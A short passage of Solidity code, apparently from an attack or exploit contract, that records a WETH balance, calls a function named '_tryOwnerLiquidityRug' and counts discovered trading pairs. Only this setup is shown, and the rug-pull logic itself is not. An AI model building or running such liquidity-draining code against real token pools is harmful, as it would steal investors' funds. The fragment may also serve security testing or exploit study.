        uint256 startingWeth = IERC20Minimal(WETH).balanceOf(address(this));
        bool acted = _tryOwnerLiquidityRug();

        address[12] memory pairs = _discoverPairs();
        uint256 pairCount;
        for (uint256 i = 0; i < pairs.length; ++i) {
            if (pairs[i] != address(0)) {
                pairCount++;
            }
        }

